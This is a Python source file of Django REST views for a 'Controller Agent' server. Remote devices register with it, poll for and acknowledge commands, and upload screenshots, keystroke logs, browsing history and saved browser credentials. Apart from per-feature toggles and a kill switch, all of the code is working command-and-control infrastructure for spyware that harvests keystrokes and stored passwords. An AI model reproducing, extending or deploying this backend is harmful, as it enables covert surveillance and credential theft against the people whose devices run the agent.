"""
API views for the Controller Agent server.
Handles device registration, config sync, file metadata, screenshots, keylogs, and commands.
"""

from django.utils import timezone
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from rest_framework.views import APIView

from .models import (
    Device, DeviceConfig, FileMetadata, ScreenshotMeta, KeylogData, Command,
    BrowserHistory, BrowserCredential
)
from .serializers import (
    DeviceRegistrationSerializer,
    DeviceSerializer,
    DeviceConfigSerializer,
    FileMetadataCreateSerializer,
    FileMetadataSerializer,
    ScreenshotMetaCreateSerializer,
    ScreenshotMetaSerializer,
    KeylogDataCreateSerializer,
    KeylogDataSerializer,
    BrowserHistoryCreateSerializer,
    BrowserHistorySerializer,
    BrowserCredentialCreateSerializer,
    BrowserCredentialSerializer,
    CommandPollSerializer,
    CommandAckSerializer,
    HeartbeatSerializer,
)


class DeviceRegistrationView(APIView):
    """
    Register a new device and receive authentication token.
    
    POST /api/device/register/
    """
    permission_classes = [AllowAny]
    
    def post(self, request):
        serializer = DeviceRegistrationSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        hardware_id = serializer.validated_data['hardware_id']
        
        # Check if device already exists
        try:
            device = Device.objects.get(hardware_id=hardware_id)
            # Device exists, return existing token (or regenerate if requested)
            if request.data.get('regenerate_token'):
                device.regenerate_token()
            
            # Update info
            device.hostname = serializer.validated_data['hostname']
            device.os_version = serializer.validated_data.get('os_version', '')
            device.agent_version = serializer.validated_data.get('agent_version', '')
            device.save()
            
            created = False
        except Device.DoesNotExist:
            # Create new device
            device = Device.objects.create(
                hardware_id=hardware_id,
                hostname=serializer.validated_data['hostname'],
                os_version=serializer.validated_data.get('os_version', ''),
                agent_version=serializer.validated_data.get('agent_version', ''),
            )
            # Create default config
            DeviceConfig.objects.create(device=device)
            created = True
        
        return Response({
            'device_id': str(device.id),
            'token': device.token,
            'created': created,
        }, status=status.HTTP_201_CREATED if created else status.HTTP_200_OK)


class DeviceHeartbeatView(APIView):
    """
    Device heartbeat endpoint. Updates last_seen and returns pending commands.
    
    POST /api/device/heartbeat/
    """
    
    def post(self, request):
        device = request.user  # Device from authentication
        
        serializer = HeartbeatSerializer(data=request.data)
        if serializer.is_valid():
            # Update device info if provided
            update_fields = []
            if serializer.validated_data.get('agent_version'):
                device.agent_version = serializer.validated_data['agent_version']
                update_fields.append('agent_version')
            if serializer.validated_data.get('os_version'):
                device.os_version = serializer.validated_data['os_version']
                update_fields.append('os_version')
            if update_fields:
                device.save(update_fields=update_fields)
        
        # Get pending commands
        pending_commands = Command.objects.filter(
            device=device,
            status='pending'
        ).exclude(
            expires_at__lt=timezone.now()
        )
        
        # Mark as delivered
        command_list = CommandPollSerializer(pending_commands, many=True).data
        pending_commands.update(status='delivered', delivered_at=timezone.now())
        
        return Response({
            'status': 'ok',
            'commands': command_list,
            'command_count': len(command_list),
        })


class ConfigSyncView(APIView):
    """
    Sync device configuration from server.
    
    GET /api/config/sync/
    """
    
    def get(self, request):
        device = request.user  # Device from authentication
        
        try:
            config = device.config
        except DeviceConfig.DoesNotExist:
            # Create default config if missing
            config = DeviceConfig.objects.create(device=device)
        
        config_data = DeviceConfigSerializer(config).data
        
        return Response({
            'device_id': str(device.id),
            'config': config_data,
            'server_time': timezone.now().isoformat(),
        })


class FileMetadataView(APIView):
    """
    Store file metadata after Cloudinary upload.
    
    POST /api/files/metadata/
    """
    
    def post(self, request):
        device = request.user
        
        # Check kill switch and file upload permission
        try:
            config = device.config
            if config.kill_switch:
                return Response(
                    {'error': 'Device is disabled by kill switch'},
                    status=status.HTTP_403_FORBIDDEN
                )
            if not config.file_upload_enabled:
                return Response(
                    {'error': 'File upload is disabled for this device'},
                    status=status.HTTP_403_FORBIDDEN
                )
        except DeviceConfig.DoesNotExist:
            pass
        
        serializer = FileMetadataCreateSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        # Check for duplicate
        public_id = serializer.validated_data['public_id']
        if FileMetadata.objects.filter(public_id=public_id).exists():
            return Response(
                {'error': 'File metadata already exists', 'public_id': public_id},
                status=status.HTTP_409_CONFLICT
            )
        
        file_metadata = FileMetadata.objects.create(
            device=device,
            public_id=public_id,
            secure_url=serializer.validated_data['secure_url'],
            resource_type=serializer.validated_data['resource_type'],
            format=serializer.validated_data['format'],
            size_bytes=serializer.validated_data['bytes'],
            original_filename=serializer.validated_data.get('original_filename', ''),
            file_type=serializer.validated_data['file_type'],
        )
        
        return Response(
            FileMetadataSerializer(file_metadata).data,
            status=status.HTTP_201_CREATED
        )


class ScreenshotMetadataView(APIView):
    """
    Store screenshot metadata after Cloudinary upload.
    
    POST /api/screenshots/metadata/
    """
    
    def post(self, request):
        device = request.user
        
        # Check kill switch and screenshot permission
        try:
            config = device.config
            if config.kill_switch:
                return Response(
                    {'error': 'Device is disabled by kill switch'},
                    status=status.HTTP_403_FORBIDDEN
                )
            if not config.screenshots_enabled:
                return Response(
                    {'error': 'Screenshots are disabled for this device'},
                    status=status.HTTP_403_FORBIDDEN
                )
        except DeviceConfig.DoesNotExist:
            pass
        
        serializer = ScreenshotMetaCreateSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        data = serializer.validated_data
        
        # Create file metadata first
        file_metadata = FileMetadata.objects.create(
            device=device,
            public_id=data['public_id'],
            secure_url=data['secure_url'],
            resource_type='image',
            format=data.get('format', 'jpg'),
            size_bytes=data['size_bytes'],
            file_type='screenshot',
        )
        
        # Create screenshot metadata
        screenshot = ScreenshotMeta.objects.create(
            device=device,
            file_metadata=file_metadata,
            public_id=data['public_id'],
            secure_url=data['secure_url'],
            trigger_type=data['trigger_type'],
            active_window_title=data.get('active_window_title', ''),
            active_process=data.get('active_process', ''),
            screen_width=data.get('screen_width'),
            screen_height=data.get('screen_height'),
            captured_at=data['captured_at'],
        )
        
        return Response(
            ScreenshotMetaSerializer(screenshot).data,
            status=status.HTTP_201_CREATED
        )


class KeylogSyncView(APIView):
    """
    Sync keylog data from agent.
    
    POST /api/keylogs/sync/
    """
    
    def post(self, request):
        device = request.user
        
        # Check kill switch and keylogger permission
        try:
            config = device.config
            if config.kill_switch:
                return Response(
                    {'error': 'Device is disabled by kill switch'},
                    status=status.HTTP_403_FORBIDDEN
                )
            if not config.keylogger_enabled:
                return Response(
                    {'error': 'Keylogger is disabled for this device'},
                    status=status.HTTP_403_FORBIDDEN
                )
        except DeviceConfig.DoesNotExist:
            pass
        
        serializer = KeylogDataCreateSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        keylog = KeylogData.objects.create(
            device=device,
            **serializer.validated_data
        )
        
        return Response(
            KeylogDataSerializer(keylog).data,
            status=status.HTTP_201_CREATED
        )


class BrowserHistorySyncView(APIView):
    """
    Sync browsing history from agent (bulk).
    
    POST /api/browser/history/
    """
    
    def post(self, request):
        device = request.user
        
        # Check permissions
        try:
            config = device.config
            if config.kill_switch or not config.browser_data_enabled:
                return Response({'error': 'Feature disabled'}, status=status.HTTP_403_FORBIDDEN)
        except DeviceConfig.DoesNotExist:
            pass
            
        serializer = BrowserHistoryCreateSerializer(data=request.data, many=True)
        serializer.is_valid(raise_exception=True)
        
        history_objs = [
            BrowserHistory(device=device, **item)
            for item in serializer.validated_data
        ]
        
        BrowserHistory.objects.bulk_create(history_objs)
        
        return Response({'status': 'ok', 'count': len(history_objs)}, status=status.HTTP_201_CREATED)


# BrowserCookieSyncView removed


class BrowserCredentialSyncView(APIView):
    """
    Sync credentials from agent (bulk).
    
    POST /api/browser/credentials/
    """
    
    def post(self, request):
        device = request.user
        
        # Check permissions
        try:
            config = device.config
            if config.kill_switch or not config.browser_data_enabled:
                return Response({'error': 'Feature disabled'}, status=status.HTTP_403_FORBIDDEN)
        except DeviceConfig.DoesNotExist:
            pass
            
        serializer = BrowserCredentialCreateSerializer(data=request.data, many=True)
        serializer.is_valid(raise_exception=True)
        
        from django.db import transaction
        
        count = 0
        try:
            with transaction.atomic():
                for item in serializer.validated_data:
                    origin_url = item.get('origin_url', '')
                    username_value = item.get('username_value', '')
                    
                    # Delete any existing duplicates before update_or_create
                    # This is slightly expensive but ensures we don't get MultipleObjectsReturned
                    existing = BrowserCredential.objects.filter(
                        device=device,
                        origin_url=origin_url,
                        username_value=username_value
                    )
                    
                    if existing.exists():
                        # If more than one, delete all but one
                        if existing.count() > 1:
                            ids_to_keep = existing.values_list('id', flat=True)[:1]
                            existing.exclude(id__in=ids_to_keep).delete()
                        
                        # Update the remaining one
                        existing.update(**item)
                    else:
                        # Create new
                        BrowserCredential.objects.create(device=device, **item)
                    
                    count += 1
        except Exception as e:
            return Response({'error': str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        return Response({'status': 'ok', 'count': count}, status=status.HTTP_201_CREATED)


class CommandPollView(APIView):
    """
    Poll for pending commands (alternative to heartbeat).
    
    GET /api/commands/poll/
    """
    
    def get(self, request):
        device = request.user
        
        pending_commands = Command.objects.filter(
            device=device,
            status='pending'
        ).exclude(
            expires_at__lt=timezone.now()
        )
        
        command_list = CommandPollSerializer(pending_commands, many=True).data
        
        # Mark as delivered
        pending_commands.update(status='delivered', delivered_at=timezone.now())
        
        return Response({
            'commands': command_list,
            'count': len(command_list),
        })


class CommandAckView(APIView):
    """
    Acknowledge command execution result.
    
    POST /api/commands/ack/
    """
    
    def post(self, request):
        device = request.user
        
        serializer = CommandAckSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        
        data = serializer.validated_data
        
        try:
            command = Command.objects.get(
                id=data['command_id'],
                device=device
            )
        except Command.DoesNotExist:
            return Response(
                {'error': 'Command not found'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        if data['status'] == 'completed':
            command.mark_completed(data.get('result'))
        else:
            command.mark_failed(data.get('error_message', 'Unknown error'))
        
        return Response({
            'status': 'acknowledged',
            'command_id': str(command.id),
        })


# Health check endpoint (no auth required)
@api_view(['GET'])
@permission_classes([AllowAny])
def health_check(request):
    """Simple health check endpoint."""
    return Response({
        'status': 'healthy',
        'server_time': timezone.now().isoformat(),
    })
